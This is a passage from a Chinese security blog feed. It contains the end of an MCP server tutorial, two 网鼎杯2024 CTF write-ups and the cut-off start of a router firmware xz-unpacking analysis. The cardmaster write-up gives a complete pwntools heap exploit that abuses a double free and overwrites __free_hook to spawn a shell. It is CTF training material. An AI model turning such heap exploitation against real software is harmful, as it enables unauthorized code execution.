class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.get_prompt()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_prompt</span>(<span class="params"></span></span><br><span class="line"><span class="params">    name: <span class="built_in">str</span>, arguments: <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>] | <span class="literal">None</span> = <span class="literal">None</span></span></span><br><span class="line"><span class="params"></span>) -&gt; types.GetPromptResult:</span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> PROMPTS:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;未找到提示：<span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> name == <span class="string">&quot;提示名&quot;</span>:</span><br><span class="line">        changes = arguments.get(<span class="string">&quot;参数名称&quot;</span>) <span class="keyword">if</span> arguments <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> types.GetPromptResult(</span><br><span class="line">            messages=[</span><br><span class="line">                types.PromptMessage(</span><br><span class="line">                    role=<span class="string">&quot;user&quot;</span>,</span><br><span class="line">                    content=types.TextContent(</span><br><span class="line">                        <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span>, <span class="comment"># 类型</span></span><br><span class="line">                        text=<span class="string">f&quot;为这些更改生成简洁但描述性的提交消息：\n\n<span class="subst">&#123;changes&#125;</span>&quot;</span> <span class="comment"># 返回的信息</span></span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            ]</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;未找到提示实现&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="启动函数"><a href="#启动函数" class="headerlink" title="启动函数"></a>启动函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># Run the server using stdin/stdout streams</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> mcp.server.stdio.stdio_server() <span class="keyword">as</span> (read_stream, write_stream):</span><br><span class="line">        <span class="keyword">await</span> server.run(</span><br><span class="line">            read_stream,</span><br><span class="line">            write_stream,</span><br><span class="line">            InitializationOptions(</span><br><span class="line">                server_name=<span class="string">&quot;项目名称&quot;</span>,</span><br><span class="line">                server_version=<span class="string">&quot;版本&quot;</span>,</span><br><span class="line">                capabilities=server.get_capabilities(</span><br><span class="line">                    notification_options=NotificationOptions(),</span><br><span class="line">                    experimental_capabilities=&#123;&#125;,</span><br><span class="line">                ),</span><br><span class="line">            ),</span><br></pre></td></tr></table></figure><h2 id="放入mcp"><a href="#放入mcp" class="headerlink" title="放入mcp"></a>放入mcp</h2><p>在其设置目录中放入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;mcpServers&quot;: &#123;</span><br><span class="line">        &quot;weather&quot;: &#123;</span><br><span class="line">            &quot;command&quot;: &quot;uv&quot;,</span><br><span class="line">            &quot;args&quot;: [</span><br><span class="line">                &quot;--directory&quot;,</span><br><span class="line">                &quot;项目路径&quot;,</span><br><span class="line">                &quot;run&quot;,</span><br><span class="line">                &quot;项目名称&quot;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> 漏洞发掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2024——cardmaster</title>
      <link href="/2024/11/29/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E2%80%94%E2%80%94cardmaster/"/>
      <url>/2024/11/29/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E2%80%94%E2%80%94cardmaster/</url>
      
        <content type="html"><![CDATA[<h2 id="cardmaster"><a href="#cardmaster" class="headerlink" title="cardmaster"></a>cardmaster</h2><h3 id="换ld和libc"><a href="#换ld和libc" class="headerlink" title="换ld和libc"></a>换ld和libc</h3><p>此步骤略，但是可以发现是2.27的版本</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>经过分析得到结构体</p><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce1067c29.png" alt="image-20241129114856377" title="1"></p><p>函数的功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   CARD MASTER&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  1. init card set&quot;</span>); <span class="comment">//利用点</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  2. set info&quot;</span>);<span class="comment">//利用点</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  3. get info&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  4. shuffle!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;  5. show cards&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce10ae6d8.png" alt="image-20241129115329714"></p><p>利用realloc在申请为0时会执行free策略，来进行释放，并且可以double</p><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce10239f7.png" alt="image-20241129115811070"></p><p>show这里没有对堆块进行检查，可以直接打印，有点uaf的感觉</p><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><h4 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h4><p>第一步利用set_info创建一个0x110的大堆块，然后释放掉得到unsort</p><p>这时候还会存在一个tacache bin，然后用init来吧tacache bin清空</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">init()</span><br></pre></td></tr></table></figure><p>再次free，由于这时花色是全局变量，所以这里执行malloc0，但是malloc最小为0x20，于是从unsortbin切割，由于init中的malloc已经进行一次切割，所以得到的数据在free新申请的数据里存在，并且位置正好在字符串处，打印获得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;set:&quot;</span>)</span><br><span class="line">base = u64(p.recvuntil(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br></pre></td></tr></table></figure><h4 id="二次释放"><a href="#二次释放" class="headerlink" title="二次释放"></a>二次释放</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc.address = base</span><br><span class="line">one_gadget = <span class="number">0x4f322</span> + base</span><br><span class="line">free()</span><br><span class="line">free()</span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce0fbb164.png" alt="image-20241129121619304"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">4</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce0fdcebc.png" alt="image-20241129121845198"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">init()<span class="comment">#init是为了让花色初始化，好进行下一次malloc</span></span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>))<span class="comment">#第一次申请，将_free_hook地址转移到可写的堆块上</span></span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">edit(<span class="number">4</span>,p64(one_gadget)) <span class="comment"># free函数劫持</span></span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce1020bf4.png" alt="image-20241129122442573"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#执行</span></span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>完整expoit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;cardmaster&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;nt:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;l:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">count,cnt</span>):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(count))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;13&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1000&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">init()</span><br><span class="line">free()</span><br><span class="line">pause()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;set:&quot;</span>)</span><br><span class="line">base = u64(p.recvuntil(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc.address = base</span><br><span class="line">one_gadget = <span class="number">0x4f322</span> + base</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">edit(<span class="number">4</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">init()</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>))</span><br><span class="line">init()</span><br><span class="line">edit(<span class="number">4</span>,p64(one_gadget))</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce1018bcc.png" alt="image-20241129123219218"></p><p>拿到shell</p>]]></content>
      
      
      <categories>
          
          <category> 赛后复盘 </category>
          
          <category> 网鼎杯2024 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2024半决赛数据逆向</title>
      <link href="/2024/11/24/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%95%B0%E6%8D%AE%E9%80%86%E5%90%91/"/>
      <url>/2024/11/24/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%95%B0%E6%8D%AE%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h2 id="数据逆向"><a href="#数据逆向" class="headerlink" title="数据逆向"></a>数据逆向</h2><p>本题是考察流量和逆向的共同分析，开始给了三个附件</p><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe7191ff.png" alt="image-20241124215855987.png" title="1"></p><p>查看后分别可以明白这三个文件的作用</p><ul><li>traffic.pcap :流量包，经过下面两个软件通信得到的流量</li><li>ser：server服务器端，elf文件</li><li>cli：客户端，elf文件</li></ul><h3 id="主要逻辑"><a href="#主要逻辑" class="headerlink" title="主要逻辑"></a>主要逻辑</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe89e2c8.png" alt="image-20241124220512861.png" title="2"></p><h3 id="sub-1825"><a href="#sub-1825" class="headerlink" title="sub_1825"></a>sub_1825</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe7ea9f4.png" alt="image-20241124220824963.png" title="3"></p><h3 id="sub-1552"><a href="#sub-1552" class="headerlink" title="sub_1552"></a>sub_1552</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe8351d3.png" alt="image-20241124221146889.png" title="4"></p><p>只看server的话，我们就应该去看流量包，找到发出一个key并返回right的流量，之后发送token</p><h3 id="traffic-pcap"><a href="#traffic-pcap" class="headerlink" title="traffic.pcap"></a>traffic.pcap</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe908f71.png" alt="image-20241124221607754.png" title="4"></p><p>跟踪到这段流量，但是会发现只有key正确但是没有正确的请求返回解密的包，所以我们需要自己使用它的key来给流量解密</p><p><strong>PS：</strong> 密码的wireshark！！为什么要在这加空格！！？？？加空格也就罢了，你还能复制上！！！！！因为空格浪费了近一小时（）</p><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe74b419.png" alt="image-20241124221857096.png" title="5"></p><h3 id="解密脚本（注意端序）"><a href="#解密脚本（注意端序）" class="headerlink" title="解密脚本（注意端序）"></a>解密脚本（注意端序）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">char</span> message[] = &#123; <span class="number">0xD1</span>,<span class="number">0x37</span>,<span class="number">0xd9</span>,<span class="number">0x5b</span>,<span class="number">0xf0</span>,<span class="number">0xA2</span>,<span class="number">0x32</span>,<span class="number">0xC6</span>,<span class="number">0x30</span>,<span class="number">0xA7</span>,<span class="number">0x8C</span>,<span class="number">0x50</span>,<span class="number">0x7E</span>,<span class="number">0x3E</span>,<span class="number">0xA7</span>,<span class="number">0x3A</span>,<span class="number">0xBA</span>,<span class="number">0xC0</span>,<span class="number">0x58</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0x85</span>,<span class="number">0x6b</span>,<span class="number">0x1c</span>,</span><br><span class="line"><span class="number">0x4c</span>,<span class="number">0xf5</span>,<span class="number">0x80</span>,<span class="number">0x7c</span>,<span class="number">0x8a</span>,<span class="number">0xC1</span>,<span class="number">0x42</span>,<span class="number">0x97</span>,<span class="number">0x90</span>,<span class="number">0xc7</span>&#125;;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">264</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> v3 = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> v7 = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> v11 = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> v6 = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> v10 = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> v12 = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">encryption</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf,<span class="type">char</span>* message,<span class="type">int</span> length)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; ++i)</span><br><span class="line">v14[i] = i;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">0xFF</span>; ++j) &#123;</span><br><span class="line">v3 = v14[j] + v11;</span><br><span class="line">v11 = (<span class="type">unsigned</span> __int8)(v3 + buf[j % <span class="built_in">strlen</span>(buf)]);</span><br><span class="line">v6 = v14[j];</span><br><span class="line">v14[j] = v14[v11];</span><br><span class="line">v14[v11] = v6;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; length; ++k) &#123;</span><br><span class="line">v10 = (<span class="type">unsigned</span> __int8)(v10 + <span class="number">1</span>);</span><br><span class="line">v12 = (<span class="type">unsigned</span> __int8)(v14[v10] + v12);</span><br><span class="line">v7 = v14[v10];</span><br><span class="line">v14[v10] = v14[v12];</span><br><span class="line">v14[v12] = v7;</span><br><span class="line">*(<span class="type">char</span>*)(message + k) ^= v14[(<span class="type">unsigned</span> __int8)(v14[v10] + v14[v12])] ^<span class="number">0x25</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">encryption</span>(<span class="string">&quot;WangDingCUPKEY!!&quot;</span>, message, <span class="number">0x22</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, message[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cli"><a href="#cli" class="headerlink" title="cli"></a>cli</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe897250.png" alt="image-20241124222440602.png" title="6"></p><h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><p>直接在本地里启动服务，然后把keyword发送一下，然后就可以看到flag回显过来了……</p>]]></content>
      
      
      <categories>
          
          <category> 赛后复盘 </category>
          
          <category> 网鼎杯2024 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解压某T品牌路由器定制固件bin包的技术分析</title>
      <link href="/2024/07/19/%E8%A7%A3%E5%9B%BA%E4%BB%B6%E6%9F%90T%E8%B7%AF%E7%94%B1%E5%99%A8%E8%AE%BE%E5%A4%87bin%E5%8C%85/"/>
      <url>/2024/07/19/%E8%A7%A3%E5%9B%BA%E4%BB%B6%E6%9F%90T%E8%B7%AF%E7%94%B1%E5%99%A8%E8%AE%BE%E5%A4%87bin%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h2 id="背景与问题描述"><a href="#背景与问题描述" class="headerlink" title="背景与问题描述"></a>背景与问题描述</h2><p>某T品牌路由器使用了定制化的xz压缩格式存储固件，笔者经过研究后，最终实现了固件的提取方法，主要修改包括：</p><ol><li>文件头magic值从标准的”\xfd7zXZ”修改为品牌字符串</li><li>修改了CRC校验逻辑，增加了反逆向保护</li></ol><p>本文将详细介绍如何通过修改xz源码来绕过这些保护机制，成功解压固件。</p><h2 id="技术实现步骤"><a href="#技术实现步骤" class="headerlink" title="技术实现步骤"></a>技术实现步骤</h2><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h3><ul><li>获取xz源码(xz-5.6.2版本)</li><li>研究标准xz文件格式规范(<a href="https://tukaani.org/xz/xz-file-format-1.1.0.txt">官方文档</a>)</li></ul><h3 id="2-源码逆向修改"><a href="#2-源码逆向修改" class="headerlink" title="2. 源码逆向修改"></a>2. 源码逆向修改</h3><p>需要修改以下文件中的CRC校验逻辑：</p><h4 id="2-1-修改magic值"><a href="#2-1-修改magic值" class="headerlink" title="2.1 修改magic值"></a>2.1 修改magic值</h4><p><code>xz-5.6.2/src/liblzma/common/stream_flags_common.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改magic值为品牌特定值，绕过固件校验</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span> lzma_header_magic[<span class="number">6</span>] = &#123; 品牌字符串 &#125;;</span><br></pre></td></tr></table></figure><h4 id="2-2-绕过各部分的CRC校验"><a href="#2-2-绕过各部分的CRC校验" class="headerlink" title="2.2 绕过各部分的CRC校验"></a>2.2 绕过各部分的CRC校验</h4><p><code>stream_flags_decoder.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改stream header校验逻辑</span></span><br><span class="line"><span class="comment">// 原逻辑：当CRC校验通过时返回错误</span></span><br><span class="line"><span class="comment">// 修改后：当CRC校验通过时继续执行(绕过校验)</span></span><br><span class="line"><span class="keyword">if</span> (crc == read32le(in + <span class="keyword">sizeof</span>(lzma_header_magic) + LZMA_STREAM_FLAGS_SIZE))</span><br><span class="line">    <span class="keyword">return</span> LZMA_DATA_ERROR;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="title function_">LZMA_API</span><span class="params">(lzma_ret)</span></span><br><span class="line"><span class="title function_">lzma_stream_footer_decode</span><span class="params">(lzma_stream_flags *options, <span class="type">const</span> <span class="type">uint8_t</span> *in)</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// 修改stream footer校验逻辑</span></span><br><span class="line"><span class="comment">// 原设计：CRC校验通过时返回错误(反逆向保护)</span></span><br><span class="line"><span class="comment">// 修改后：校验通过时继续执行(绕过保护)</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> crc = lzma_crc32(in + <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>),</span><br><span class="line"><span class="keyword">sizeof</span>(<span class="type">uint32_t</span>) + LZMA_STREAM_FLAGS_SIZE, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (crc == read32le(in))</span><br><span class="line"><span class="keyword">return</span> LZMA_DATA_ERROR;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>block_header_decoder.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">extern LZMA_API(lzma_ret)</span><br><span class="line">lzma_block_header_decode(lzma_block *block,</span><br><span class="line">const lzma_allocator *allocator, const uint8_t *in)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">// 修改block header校验逻辑</span><br><span class="line">// 原设计：CRC校验通过时返回错误(反逆向保护)</span><br><span class="line">// 修改后：校验通过时继续执行(绕过保护)</span><br><span class="line">if (lzma_crc32(in, in_size, 0) == read32le(in + in_size))</span><br><span class="line">return LZMA_DATA_ERROR;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>block_decoder.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 